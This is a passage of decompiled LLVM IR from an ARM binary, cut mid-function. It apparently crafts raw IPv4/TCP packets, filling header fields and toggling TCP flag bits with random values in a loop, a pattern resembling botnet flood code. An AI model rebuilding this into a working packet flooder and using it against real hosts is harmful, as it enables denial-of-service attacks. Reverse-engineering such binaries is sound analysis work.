  br i1 %v7_c8f4, label %dec_label_pc_c97c, label %dec_label_pc_c900

dec_label_pc_c900:                                ; preds = %dec_label_pc_c8c4
  store i32 %storemerge34, i32* %lr.global-to-local, align 4
  store i32 %tmp41, i32* %r3.global-to-local, align 4
  store i32 %., i32* %r1.global-to-local, align 4
  %v7_c914 = icmp eq i32 %v6_c8ec, 40
  store i1 %v7_c914, i1* %cpsr_z.global-to-local, align 1
  %tmp112 = icmp ult i32 %v6_c8ec, 41
  br i1 %tmp112, label %.thread32, label %bb87

.thread32:                                        ; preds = %dec_label_pc_c900
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c8b4

bb87:                                             ; preds = %dec_label_pc_c900
  store i1 %v9_c91c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c91c, label %dec_label_pc_c8b4, label %dec_label_pc_c924

dec_label_pc_c924:                                ; preds = %bb87
  store i32 %v4_c928, i32* %r1.global-to-local, align 4
  store i32 %v4_c92c, i32* %ip.global-to-local, align 4
  store i32 %v4_c930, i32* %r2.global-to-local, align 4
  store i32 %v5_c934, i32* %r3.global-to-local, align 4
  store i32 %v5_c938, i32* @r5, align 4
  store i1 %v9_c93c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c93c, label %dec_label_pc_c944, label %dec_label_pc_c8b4

dec_label_pc_c944:                                ; preds = %dec_label_pc_c924
  store i32 %v4_c944, i32* %r2.global-to-local, align 4
  store i32 %v1_c948, i32* %r3.global-to-local, align 4
  store i1 %v2_c94c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c94c, label %dec_label_pc_c998, label %dec_label_pc_c954

dec_label_pc_c954:                                ; preds = %dec_label_pc_c944
  store i1 %v2_c954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c954, label %dec_label_pc_c8b4, label %dec_label_pc_c95c

dec_label_pc_c95c:                                ; preds = %dec_label_pc_c954
  %v0_c95c = load i32, i32* @r7, align 4
  store i32 %v0_c95c, i32* %r0.global-to-local, align 4
  %v1_c960 = call i32 @_close(i32 %v0_c95c)
  store i32 %v1_c960, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c75c

dec_label_pc_c968:                                ; preds = %dec_label_pc_c8b4
  %v0_c968 = load i32, i32* @r7, align 4
  store i32 %v0_c968, i32* %r0.global-to-local, align 4
  %v1_c96c = call i32 @_close(i32 %v0_c968)
  store i32 %v1_c96c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c778

dec_label_pc_c974:                                ; preds = %dec_label_pc_c708
  store i32 %v3_c6f0, i32* %r0.global-to-local, align 4
  %v1_c978 = call i32 @_close(i32 %v3_c6f0)
  store i32 %v1_c978, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c97c

dec_label_pc_c97c:                                ; preds = %dec_label_pc_c8c4, %dec_label_pc_c520, %dec_label_pc_c974
  %v29_c980 = phi i32 [ %v3_c6f0, %dec_label_pc_c520 ], [ %v1_c978, %dec_label_pc_c974 ], [ 0, %dec_label_pc_c8c4 ]
  store i32 %v3_c520, i32* %r4.global-to-local, align 4
  ret i32 %v29_c980

dec_label_pc_c984:                                ; preds = %dec_label_pc_c848
  %v0_c984 = call i32 @function_117dc()
  %v1_c984 = trunc i32 %v0_c984 to i8
  store i32 %v0_c984, i32* %r0.global-to-local, align 4
  %v4_c988 = sdiv i32 %v0_c984, 256
  store i32 %v4_c988, i32* %r3.global-to-local, align 4
  %v1_c98c = trunc i32 %v4_c988 to i8
  br label %dec_label_pc_c878

dec_label_pc_c998:                                ; preds = %dec_label_pc_c944
  %v3_c998 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c998, i32* %r4.global-to-local, align 4
  store i32 %v2_c540, i32* %r2.global-to-local, align 4
  %v3_c9a0 = mul i32 %v3_c998, 16
  store i32 %v3_c9a0, i32* %ip.global-to-local, align 4
  %v3_c9a4 = add i32 %v3_c9a0, %v2_c540
  %v4_c9a4 = inttoptr i32 %v3_c9a4 to i32*
  store i32 %storemerge34, i32* %v4_c9a4, align 4
  %v0_c9a8 = load i32, i32* @r6, align 4
  %v1_c9a8 = add i32 %v0_c9a8, 4
  %v2_c9a8 = inttoptr i32 %v1_c9a8 to i32*
  %v3_c9a8 = load i32, i32* %v2_c9a8, align 4
  %v1_c9b4 = and i32 %v3_c9a8, 65280
  store i32 %v1_c9b4, i32* %r1.global-to-local, align 4
  %v3_c9b8 = mul i32 %v3_c9a8, 16777216
  store i32 %v2_c540, i32* %r0.global-to-local, align 4
  %v4_c9c4 = mul nuw nsw i32 %v1_c9b4, 256
  %v5_c9c4 = or i32 %v4_c9c4, %v3_c9b8
  store i32 %v5_c9c4, i32* %r2.global-to-local, align 4
  %v1_c9c8 = load i32, i32* %ip.global-to-local, align 4
  %v2_c9c8 = add i32 %v1_c9c8, %v2_c540
  store i32 %v2_c9c8, i32* %ip.global-to-local, align 4
  %v2_c9cc = call i32 @llvm.bswap.i32(i32 %v3_c9a8)
  store i32 %v2_c9cc, i32* %r3.global-to-local, align 4
  %v2_c9d0 = add i32 %v2_c9c8, 4
  %v3_c9d0 = inttoptr i32 %v2_c9d0 to i32*
  store i32 %v2_c9cc, i32* %v3_c9d0, align 4
  %v0_c9d4 = load i32, i32* @r6, align 4
  %v1_c9d4 = add i32 %v0_c9d4, 8
  %v2_c9d4 = inttoptr i32 %v1_c9d4 to i32*
  %v3_c9d4 = load i32, i32* %v2_c9d4, align 4
  store i32 %v3_c9d4, i32* %r0.global-to-local, align 4
  %v1_c9dc = and i32 %v3_c9d4, 65280
  store i32 %v1_c9dc, i32* %r1.global-to-local, align 4
  %v3_c9e0 = mul i32 %v3_c9d4, 16777216
  %v4_c9e8 = mul nuw nsw i32 %v1_c9dc, 256
  %v5_c9e8 = or i32 %v4_c9e8, %v3_c9e0
  store i32 %v5_c9e8, i32* %r2.global-to-local, align 4
  %v2_c9f0 = call i32 @llvm.bswap.i32(i32 %v3_c9d4)
  store i32 %v2_c9f0, i32* %r3.global-to-local, align 4
  %v1_c9f4 = load i32, i32* %ip.global-to-local, align 4
  %v2_c9f4 = add i32 %v1_c9f4, 8
  %v3_c9f4 = inttoptr i32 %v2_c9f4 to i32*
  store i32 %v2_c9f0, i32* %v3_c9f4, align 4
  %v0_c9f8 = load i32, i32* @r6, align 4
  %v1_c9f8 = inttoptr i32 %v0_c9f8 to i32*
  %v2_c9f8 = load i32, i32* %v1_c9f8, align 4
  %v3_c9fc = udiv i32 %v2_c9f8, 65536
  store i32 %v3_c9fc, i32* %r2.global-to-local, align 4
  %v3_ca005 = udiv i32 %v2_c9f8, 16777216
  store i32 %v3_ca005, i32* %r1.global-to-local, align 4
  %v0_ca04 = load i32, i32* @r5, align 4
  %v3_ca04 = sdiv i32 %v0_ca04, 256
  store i32 %v3_ca04, i32* %r3.global-to-local, align 4
  %v1_ca08 = trunc i32 %v3_ca04 to i8
  %v2_ca08 = load i32, i32* %ip.global-to-local, align 4
  %v3_ca08 = add i32 %v2_ca08, 15
  %v4_ca08 = inttoptr i32 %v3_ca08 to i8*
  store i8 %v1_ca08, i8* %v4_ca08, align 1
  %v0_ca0c = load i32, i32* %r1.global-to-local, align 4
  %v1_ca0c = trunc i32 %v0_ca0c to i8
  %v2_ca0c = load i32, i32* %ip.global-to-local, align 4
  %v3_ca0c = add i32 %v2_ca0c, 13
  %v4_ca0c = inttoptr i32 %v3_ca0c to i8*
  store i8 %v1_ca0c, i8* %v4_ca0c, align 1
  %v0_ca10 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca10 = trunc i32 %v0_ca10 to i8
  %v2_ca10 = load i32, i32* %ip.global-to-local, align 4
  %v3_ca10 = add i32 %v2_ca10, 12
  %v4_ca10 = inttoptr i32 %v3_ca10 to i8*
  store i8 %v1_ca10, i8* %v4_ca10, align 1
  %v0_ca14 = load i32, i32* @r5, align 4
  %v1_ca14 = trunc i32 %v0_ca14 to i8
  %v2_ca14 = load i32, i32* %ip.global-to-local, align 4
  %v3_ca14 = add i32 %v2_ca14, 14
  %v4_ca14 = inttoptr i32 %v3_ca14 to i8*
  store i8 %v1_ca14, i8* %v4_ca14, align 1
  %v0_ca18 = load i32, i32* @sl, align 4
  store i32 %v0_ca18, i32* %r0.global-to-local, align 4
  %v1_ca1c = call i32 @_malloc(i32 %v0_ca18)
  store i32 %v1_ca1c, i32* %r0.global-to-local, align 4
  store i32 %v2_c550, i32* %r1.global-to-local, align 4
  %v3_ca24 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ca24, i32* %r2.global-to-local, align 4
  %v2_ca28 = load i32, i32* %r4.global-to-local, align 4
  %v5_ca28 = mul i32 %v2_ca28, 4
  %v6_ca28 = add i32 %v5_ca28, %v2_c550
  %v7_ca28 = inttoptr i32 %v6_ca28 to i32*
  store i32 %v1_ca1c, i32* %v7_ca28, align 4
  %v0_ca2c = load i32, i32* %r1.global-to-local, align 4
  %v1_ca2c = load i32, i32* %r2.global-to-local, align 4
  %v4_ca2c = mul i32 %v1_ca2c, 4
  %v5_ca2c = add i32 %v4_ca2c, %v0_ca2c
  %v6_ca2c = inttoptr i32 %v5_ca2c to i32*
  %v7_ca2c = load i32, i32* %v6_ca2c, align 4
  store i32 %v7_ca2c, i32* @r4, align 4
  %v1_ca30 = inttoptr i32 %v7_ca2c to i8*
  %v2_ca30 = load i8, i8* %v1_ca30, align 1
  %tmp113 = urem i8 %v2_ca30, 16
  %v1_ca34 = zext i8 %tmp113 to i32
  %v1_ca38 = or i32 %v1_ca34, 64
  store i32 %v1_ca38, i32* %r3.global-to-local, align 4
  %v1_ca3c = trunc i32 %v1_ca38 to i8
  store i8 %v1_ca3c, i8* %v1_ca30, align 1
  %v0_ca40 = load i32, i32* @sl, align 4
  %v3_ca40 = mul i32 %v0_ca40, 65536
  store i32 %v3_ca40, i32* %r2.global-to-local, align 4
  %v0_ca44 = load i32, i32* @r4, align 4
  %v1_ca44 = inttoptr i32 %v0_ca44 to i8*
  %v2_ca44 = load i8, i8* %v1_ca44, align 1
  %v1_ca4c = urem i32 %v0_ca40, 256
  %tmp88 = udiv i32 %v0_ca40, 256
  %v3_ca50 = urem i32 %tmp88, 256
  %v1_ca54 = and i8 %v2_ca44, -16
  %v4_ca58 = mul nuw nsw i32 %v1_ca4c, 256
  %v5_ca58 = or i32 %v4_ca58, %v3_ca50
  store i32 %v5_ca58, i32* %r2.global-to-local, align 4
  %v1_ca5c = or i8 %v1_ca54, 5
  store i32 %v1_c5d0, i32* %ip.global-to-local, align 4
  store i32 %v1_ca4c, i32* %r3.global-to-local, align 4
  store i8 %v1_ca5c, i8* %v1_ca44, align 1
  %v0_ca6c = load i32, i32* %r3.global-to-local, align 4
  %v1_ca6c = trunc i32 %v0_ca6c to i8
  %v2_ca6c = load i32, i32* @r4, align 4
  %v3_ca6c = add i32 %v2_ca6c, 3
  %v4_ca6c = inttoptr i32 %v3_ca6c to i8*
  store i8 %v1_ca6c, i8* %v4_ca6c, align 1
  store i32 %v4_ca70, i32* %r3.global-to-local, align 4
  %v0_ca74 = load i32, i32* %ip.global-to-local, align 4
  %v2_ca74 = icmp eq i32 %v0_ca74, 0
  store i1 %v2_ca74, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_c8a0, i32* %r0.global-to-local, align 4
  store i32 %v3_c8a8, i32* %r1.global-to-local, align 4
  %v2_ca80 = load i32, i32* @r4, align 4
  %v3_ca80 = add i32 %v2_ca80, 1
  %v4_ca80 = inttoptr i32 %v3_ca80 to i8*
  store i8 %v1_ca80, i8* %v4_ca80, align 1
  store i32 %v4_ca84, i32* %ip.global-to-local, align 4
  %v0_ca88 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca88, label %bb90, label %bb89

bb89:                                             ; preds = %dec_label_pc_c998
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb90

bb90:                                             ; preds = %dec_label_pc_c998, %bb89
  %v0_ca8c = load i32, i32* %r2.global-to-local, align 4
  %v1_ca8c = trunc i32 %v0_ca8c to i8
  %v2_ca8c = load i32, i32* @r4, align 4
  %v3_ca8c = add i32 %v2_ca8c, 2
  %v4_ca8c = inttoptr i32 %v3_ca8c to i8*
  store i8 %v1_ca8c, i8* %v4_ca8c, align 1
  %v0_ca90 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca90, label %.thread9, label %bb91

bb91:                                             ; preds = %bb90
  %v1_ca90 = load i32, i32* %r3.global-to-local, align 4
  %v2_ca90 = trunc i32 %v1_ca90 to i8
  %v3_ca90 = load i32, i32* @r4, align 4
  %v4_ca90 = add i32 %v3_ca90, 6
  %v5_ca90 = inttoptr i32 %v4_ca90 to i8*
  store i8 %v2_ca90, i8* %v5_ca90, align 1
  %v0_ca94.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca94.pr, label %.thread9, label %bb92

bb92:                                             ; preds = %bb91
  store i32 0, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb90, %bb91, %bb92
  store i32 6, i32* %r3.global-to-local, align 4
  %v0_ca9c = load i32, i32* %ip.global-to-local, align 4
  %v1_ca9c = trunc i32 %v0_ca9c to i8
  %v2_ca9c = load i32, i32* @r4, align 4
  %v3_ca9c = add i32 %v2_ca9c, 8
  %v4_ca9c = inttoptr i32 %v3_ca9c to i8*
  store i8 %v1_ca9c, i8* %v4_ca9c, align 1
  %v0_caa0 = load i32, i32* %r3.global-to-local, align 4
  %v1_caa0 = trunc i32 %v0_caa0 to i8
  %v2_caa0 = load i32, i32* @r4, align 4
  %v3_caa0 = add i32 %v2_caa0, 9
  %v4_caa0 = inttoptr i32 %v3_caa0 to i8*
  store i8 %v1_caa0, i8* %v4_caa0, align 1
  %v0_caa4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_caa4, label %bb94, label %bb93

bb93:                                             ; preds = %.thread9
  %v1_caa4 = load i32, i32* %r2.global-to-local, align 4
  %v2_caa4 = trunc i32 %v1_caa4 to i8
  %v3_caa4 = load i32, i32* @r4, align 4
  %v4_caa4 = add i32 %v3_caa4, 7
  %v5_caa4 = inttoptr i32 %v4_caa4 to i8*
  store i8 %v2_caa4, i8* %v5_caa4, align 1
  br label %bb94

bb94:                                             ; preds = %.thread9, %bb93
  %v2_caac = load i32, i32* @global_var_1d9ac.143, align 4
  store i32 %v2_caac, i32* %r3.global-to-local, align 4
  %v1_cab0 = load i32, i32* @r4, align 4
  %v2_cab0 = add i32 %v1_cab0, 12
  %v3_cab0 = inttoptr i32 %v2_cab0 to i32*
  store i32 %v2_caac, i32* %v3_cab0, align 4
  %v0_cab4 = load i32, i32* %r0.global-to-local, align 4
  %v1_cab4 = trunc i32 %v0_cab4 to i8
  %v2_cab4 = load i32, i32* @r4, align 4
  %v3_cab4 = add i32 %v2_cab4, 4
  %v4_cab4 = inttoptr i32 %v3_cab4 to i8*
  store i8 %v1_cab4, i8* %v4_cab4, align 1
  %v3_cab8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cab8, i32* %r2.global-to-local, align 4
  store i32 %v2_c540, i32* %r0.global-to-local, align 4
  %v4_cac0 = mul i32 %v3_cab8, 16
  %v5_cac0 = add i32 %v4_cac0, %v2_c540
  %v6_cac0 = inttoptr i32 %v5_cac0 to i32*
  %v7_cac0 = load i32, i32* %v6_cac0, align 4
  store i32 %v7_cac0, i32* %r3.global-to-local, align 4
  %v0_cac4 = load i32, i32* %r1.global-to-local, align 4
  %v1_cac4 = trunc i32 %v0_cac4 to i8
  %v2_cac4 = load i32, i32* @r4, align 4
  %v3_cac4 = add i32 %v2_cac4, 5
  %v4_cac4 = inttoptr i32 %v3_cac4 to i8*
  store i8 %v1_cac4, i8* %v4_cac4, align 1
  %v0_cac8 = load i32, i32* %r3.global-to-local, align 4
  %v1_cac8 = load i32, i32* @r4, align 4
  %v2_cac8 = add i32 %v1_cac8, 16
  %v3_cac8 = inttoptr i32 %v2_cac8 to i32*
  store i32 %v0_cac8, i32* %v3_cac8, align 4
  %v0_cacc = load i32, i32* %r2.global-to-local, align 4
  %v3_cacc = mul i32 %v0_cacc, 16
  %v1_cad0 = load i32, i32* %r0.global-to-local, align 4
  %v2_cad0 = add i32 %v1_cad0, %v3_cacc
  store i32 %v2_cad0, i32* %r2.global-to-local, align 4
  %v1_cad4 = add i32 %v2_cad0, 13
  %v2_cad4 = inttoptr i32 %v1_cad4 to i8*
  %v3_cad4 = load i8, i8* %v2_cad4, align 1
  %v4_cad4 = zext i8 %v3_cad4 to i32
  store i32 %v4_cad4, i32* %r1.global-to-local, align 4
  %v1_cad8 = add i32 %v2_cad0, 12
  %v2_cad8 = inttoptr i32 %v1_cad8 to i8*
  %v3_cad8 = load i8, i8* %v2_cad8, align 1
  %v4_cad8 = zext i8 %v3_cad8 to i32
  %v4_cadc = mul nuw nsw i32 %v4_cad4, 256
  %v5_cadc = or i32 %v4_cad8, %v4_cadc
  store i32 %v5_cadc, i32* %r3.global-to-local, align 4
  %v2_cae0 = load i32, i32* @r4, align 4
  %v3_cae0 = add i32 %v2_cae0, 20
  %v4_cae0 = inttoptr i32 %v3_cae0 to i8*
  store i8 %v3_cad8, i8* %v4_cae0, align 1
  %v0_cae4 = load i32, i32* @r4, align 4
  %v1_cae4 = add i32 %v0_cae4, 20
  store i32 %v1_cae4, i32* @r6, align 4
  %v0_cae8 = load i32, i32* %r3.global-to-local, align 4
  %v3_cae8 = sdiv i32 %v0_cae8, 256
  store i32 %v3_cae8, i32* %r3.global-to-local, align 4
  %v1_caec = trunc i32 %v3_cae8 to i8
  %v3_caec = add i32 %v0_cae4, 21
  %v4_caec = inttoptr i32 %v3_caec to i8*
  store i8 %v1_caec, i8* %v4_caec, align 1
  %v0_caf0 = load i32, i32* @r6, align 4
  %v1_caf0 = add i32 %v0_caf0, 13
  %v2_caf0 = inttoptr i32 %v1_caf0 to i8*
  %v3_caf0 = load i8, i8* %v2_caf0, align 1
  %v4_caf0 = zext i8 %v3_caf0 to i32
  store i32 %v4_caf0, i32* %r3.global-to-local, align 4
  %v0_caf4 = load i32, i32* %r2.global-to-local, align 4
  %v1_caf4 = add i32 %v0_caf4, 8
  %v2_caf4 = inttoptr i32 %v1_caf4 to i32*
  %v3_caf4 = load i32, i32* %v2_caf4, align 4
  store i32 %v3_caf4, i32* %r1.global-to-local, align 4
  %v1_caf8 = or i32 %v4_caf0, 1
  store i32 %v1_caf8, i32* %r3.global-to-local, align 4
  %v1_cafc = add i32 %v0_caf4, 15
  %v2_cafc = inttoptr i32 %v1_cafc to i8*
  %v3_cafc = load i8, i8* %v2_cafc, align 1
  %v4_cafc = zext i8 %v3_cafc to i32
  store i32 %v4_cafc, i32* %ip.global-to-local, align 4
  %v1_cb00 = add i32 %v0_caf4, 14
  %v2_cb00 = inttoptr i32 %v1_cb00 to i8*
  %v3_cb00 = load i8, i8* %v2_cb00, align 1
  %v4_cb00 = zext i8 %v3_cb00 to i32
  store i32 %v4_cb00, i32* %r0.global-to-local, align 4
  %v2_cb04 = add i32 %v0_caf0, 4
  %v3_cb04 = inttoptr i32 %v2_cb04 to i32*
  store i32 %v3_caf4, i32* %v3_cb04, align 4
  %v0_cb08 = load i32, i32* %r2.global-to-local, align 4
  %v1_cb08 = add i32 %v0_cb08, 4
  %v2_cb08 = inttoptr i32 %v1_cb08 to i32*
  %v3_cb08 = load i32, i32* %v2_cb08, align 4
  store i32 %v3_cb08, i32* %lr.global-to-local, align 4
  %v0_cb0c = load i32, i32* %r3.global-to-local, align 4
  %v1_cb0c = trunc i32 %v0_cb0c to i8
  %v2_cb0c = load i32, i32* @r6, align 4
  %v3_cb0c = add i32 %v2_cb0c, 13
  %v4_cb0c = inttoptr i32 %v3_cb0c to i8*
  store i8 %v1_cb0c, i8* %v4_cb0c, align 1
  %v0_cb10 = load i32, i32* @r6, align 4
  %v1_cb10 = add i32 %v0_cb10, 12
  %v2_cb10 = inttoptr i32 %v1_cb10 to i8*
  %v3_cb10 = load i8, i8* %v2_cb10, align 1
  %v4_cb10 = zext i8 %v3_cb10 to i32
  store i32 %v4_cb10, i32* %r2.global-to-local, align 4
  %v1_cb14 = add i32 %v0_cb10, 13
  %v2_cb14 = inttoptr i32 %v1_cb14 to i8*
  %v3_cb14 = load i8, i8* %v2_cb14, align 1
  %v4_cb14 = zext i8 %v3_cb14 to i32
  %v0_cb18 = load i32, i32* %r0.global-to-local, align 4
  %v1_cb18 = load i32, i32* %ip.global-to-local, align 4
  %v4_cb18 = mul i32 %v1_cb18, 256
  %v5_cb18 = or i32 %v4_cb18, %v0_cb18
  store i32 %v5_cb18, i32* %r0.global-to-local, align 4
  %tmp114 = urem i8 %v3_cb10, 16
  %v1_cb1c = zext i8 %tmp114 to i32
  %v3_cb20 = sdiv i32 %v5_cb18, 256
  store i32 %v3_cb20, i32* %r1.global-to-local, align 4
  %v1_cb24 = or i32 %v1_cb1c, 128
  store i32 %v1_cb24, i32* %r2.global-to-local, align 4
  %v1_cb28 = or i32 %v4_cb14, 16
  store i32 %v1_cb28, i32* %r3.global-to-local, align 4
  %v1_cb2c = trunc i32 %v3_cb20 to i8
  %v3_cb2c = add i32 %v0_cb10, 3
  %v4_cb2c = inttoptr i32 %v3_cb2c to i8*
  store i8 %v1_cb2c, i8* %v4_cb2c, align 1
  %v0_cb30 = load i32, i32* %r2.global-to-local, align 4
  %v1_cb30 = trunc i32 %v0_cb30 to i8
  %v2_cb30 = load i32, i32* @r6, align 4
  %v3_cb30 = add i32 %v2_cb30, 12
  %v4_cb30 = inttoptr i32 %v3_cb30 to i8*
  store i8 %v1_cb30, i8* %v4_cb30, align 1
  %v0_cb34 = load i32, i32* %r3.global-to-local, align 4
  %v1_cb34 = trunc i32 %v0_cb34 to i8
  %v2_cb34 = load i32, i32* @r6, align 4
  %v3_cb34 = add i32 %v2_cb34, 13
  %v4_cb34 = inttoptr i32 %v3_cb34 to i8*
  store i8 %v1_cb34, i8* %v4_cb34, align 1
  %v0_cb38 = load i32, i32* %lr.global-to-local, align 4
  %v1_cb38 = load i32, i32* @r6, align 4
  %v2_cb38 = add i32 %v1_cb38, 8
  %v3_cb38 = inttoptr i32 %v2_cb38 to i32*
  store i32 %v0_cb38, i32* %v3_cb38, align 4
  %v0_cb3c = load i32, i32* %r0.global-to-local, align 4
  %v1_cb3c = trunc i32 %v0_cb3c to i8
  %v2_cb3c = load i32, i32* @r6, align 4
  %v3_cb3c = add i32 %v2_cb3c, 2
  %v4_cb3c = inttoptr i32 %v3_cb3c to i8*
  store i8 %v1_cb3c, i8* %v4_cb3c, align 1
  %v0_cb40 = call i32 @function_117dc()
  %v1_cb40 = trunc i32 %v0_cb40 to i8
  store i32 %v0_cb40, i32* %r0.global-to-local, align 4
  store i32 %v1_c608, i32* %r1.global-to-local, align 4
  %v0_cb48 = load i32, i32* @r6, align 4
  %v1_cb48 = add i32 %v0_cb48, 13
  %v2_cb48 = inttoptr i32 %v1_cb48 to i8*
  %v3_cb48 = load i8, i8* %v2_cb48, align 1
  %v4_cb48 = zext i8 %v3_cb48 to i32
  store i32 %v1_cb4c, i32* %r2.global-to-local, align 4
  %v1_cb50 = and i32 %v4_cb48, 223
  %v5_cb54 = or i32 %v1_cb50, %v4_cb54
  store i32 %v5_cb54, i32* %r3.global-to-local, align 4
  %v1_cb58 = trunc i32 %v5_cb54 to i8
  store i8 %v1_cb58, i8* %v2_cb48, align 1
  store i32 %v1_c628, i32* %ip.global-to-local, align 4
  %v0_cb60 = load i32, i32* @r6, align 4
  %v1_cb60 = add i32 %v0_cb60, 13
  %v2_cb60 = inttoptr i32 %v1_cb60 to i8*
  %v3_cb60 = load i8, i8* %v2_cb60, align 1
  %v4_cb60 = zext i8 %v3_cb60 to i32
  store i32 %v1_cb64, i32* %r3.global-to-local, align 4
  %v1_cb68 = and i32 %v4_cb60, 239
  %v5_cb6c = or i32 %v1_cb68, %v4_cb6c
  store i32 %v5_cb6c, i32* %r2.global-to-local, align 4
  %v1_cb70 = trunc i32 %v5_cb6c to i8
  store i8 %v1_cb70, i8* %v2_cb60, align 1
  store i32 %v1_c648, i32* %r1.global-to-local, align 4
  %v0_cb78 = load i32, i32* @r6, align 4
  %v1_cb78 = add i32 %v0_cb78, 13
  %v2_cb78 = inttoptr i32 %v1_cb78 to i8*
  %v3_cb78 = load i8, i8* %v2_cb78, align 1
  %v4_cb78 = zext i8 %v3_cb78 to i32
  store i32 %v1_cb7c, i32* %r2.global-to-local, align 4
  %v1_cb80 = and i32 %v4_cb78, 247
  %v5_cb84 = or i32 %v1_cb80, %v4_cb84
  store i32 %v5_cb84, i32* %r3.global-to-local, align 4
  %v1_cb88 = trunc i32 %v5_cb84 to i8
  store i8 %v1_cb88, i8* %v2_cb78, align 1
  store i32 %v1_c668, i32* %ip.global-to-local, align 4
  %v0_cb90 = load i32, i32* @r6, align 4
  %v1_cb90 = add i32 %v0_cb90, 13
  %v2_cb90 = inttoptr i32 %v1_cb90 to i8*
  %v3_cb90 = load i8, i8* %v2_cb90, align 1
  %v4_cb90 = zext i8 %v3_cb90 to i32
  store i32 %v1_cb94, i32* %r3.global-to-local, align 4
  %v1_cb98 = and i32 %v4_cb90, 251
  %v5_cb9c = or i32 %v1_cb98, %v4_cb9c
  store i32 %v5_cb9c, i32* %r2.global-to-local, align 4
  %v1_cba0 = trunc i32 %v5_cb9c to i8
  store i8 %v1_cba0, i8* %v2_cb90, align 1
  store i32 %v1_c688, i32* %r1.global-to-local, align 4
  %v0_cba8 = load i32, i32* @r6, align 4
  %v1_cba8 = add i32 %v0_cba8, 13
  %v2_cba8 = inttoptr i32 %v1_cba8 to i8*
  %v3_cba8 = load i8, i8* %v2_cba8, align 1
  %v4_cba8 = zext i8 %v3_cba8 to i32
  store i32 %v1_cbac, i32* %r2.global-to-local, align 4
  %v1_cbb0 = and i32 %v4_cba8, 253
  %v4_cbb4 = or i32 %v1_cbb0, %v3_cbb4
  store i32 %v4_cbb4, i32* %r3.global-to-local, align 4
  %v1_cbb8 = trunc i32 %v4_cbb4 to i8
  store i8 %v1_cbb8, i8* %v2_cba8, align 1
  %v0_cbbc = load i32, i32* @r6, align 4
  %v1_cbbc = add i32 %v0_cbbc, 13
  %v2_cbbc = inttoptr i32 %v1_cbbc to i8*
  %v3_cbbc = load i8, i8* %v2_cbbc, align 1
  %v4_cbbc = zext i8 %v3_cbbc to i32
  %v0_cbc0 = load i32, i32* @r8, align 4
  %v1_cbc0 = urem i32 %v0_cbc0, 2
  %v1_cbc4 = and i32 %v4_cbbc, 254
  store i32 %v1_cbc4, i32* %r2.global-to-local, align 4
  %v4_cbc836 = udiv i32 %v0_cb40, 256
  %v2_cbcc = or i32 %v1_cbc4, %v1_cbc0
  store i32 %v2_cbcc, i32* %r3.global-to-local, align 4
  %v1_cbd0 = trunc i32 %v4_cbc836 to i8
  %v3_cbd0 = add i32 %v0_cbbc, 15
  %v4_cbd0 = inttoptr i32 %v3_cbd0 to i8*
  store i8 %v1_cbd0, i8* %v4_cbd0, align 1
  %v3_cbd4 = load i32, i32* @r6, align 4
  %v4_cbd4 = add i32 %v3_cbd4, 14
  %v5_cbd4 = inttoptr i32 %v4_cbd4 to i8*
  store i8 %v1_cb40, i8* %v5_cbd4, align 1
  %v0_cbd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_cbd8 = trunc i32 %v0_cbd8 to i8
  %v2_cbd8 = load i32, i32* @r6, align 4
  %v3_cbd8 = add i32 %v2_cbd8, 13
  %v4_cbd8 = inttoptr i32 %v3_cbd8 to i8*
  store i8 %v1_cbd8, i8* %v4_cbd8, align 1
  %v0_cbdc = load i32, i32* @r4, align 4
  %v1_cbdc = add i32 %v0_cbdc, 40
  store i32 %v1_cbdc, i32* %r0.global-to-local, align 4
  %v0_cbe0 = load i32, i32* @sb, align 4
  store i32 %v0_cbe0, i32* @r1, align 4
  %v1_cbe4 = inttoptr i32 %v1_cbdc to i8*
  %v2_cbe4 = call i32 @function_119b8(i8* %v1_cbe4)
  store i32 %v2_cbe4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cbe8

dec_label_pc_cbe8:                                ; preds = %dec_label_pc_c778, %bb94
  %v3_cbe8 = load i32, i32* %stack_var_-40, align 4
  %v1_cbec = add i32 %v3_cbe8, 1
  store i32 %v1_cbec, i32* %r3.global-to-local, align 4
  %v1_cbf0 = load i32, i32* @fp, align 4
  %v9_cbf0 = icmp eq i32 %v1_cbec, %v1_cbf0
  store i1 %v9_cbf0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cbec, i32* %stack_var_-40, align 4
  %v5_cbf8 = icmp slt i32 %v1_cbec, %v1_cbf0
  br i1 %v5_cbf8, label %dec_label_pc_c75c, label %dec_label_pc_cbfc

dec_label_pc_cbfc:                                ; preds = %dec_label_pc_cbe8, %.thread26
  %v0_cc0420 = phi i32 [ %v0_c730, %.thread26 ], [ %v1_cbf0, %dec_label_pc_cbe8 ]
  %v0_cbfc = load i32, i32* @sb, align 4
  %v1_cbfc = add i32 %v0_cbfc, 40
  store i32 %v1_cbfc, i32* @sl, align 4
  %v1_cc00 = add i32 %v0_cbfc, 20
  store i32 %v1_cc00, i32* @r7, align 4
  %v2_cd7c = icmp eq i32 %v1_c6e0, 0
  %v6_cc30 = inttoptr i32 %v2_c550 to i32*
  %v3_cc38 = icmp eq i32 %v3_c738, 65535
  br label %dec_label_pc_cc04

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cc60, %dec_label_pc_cbfc
  %v0_cc04 = phi i32 [ %v1_cd40, %dec_label_pc_cc60 ], [ %v0_cc0420, %dec_label_pc_cbfc ]
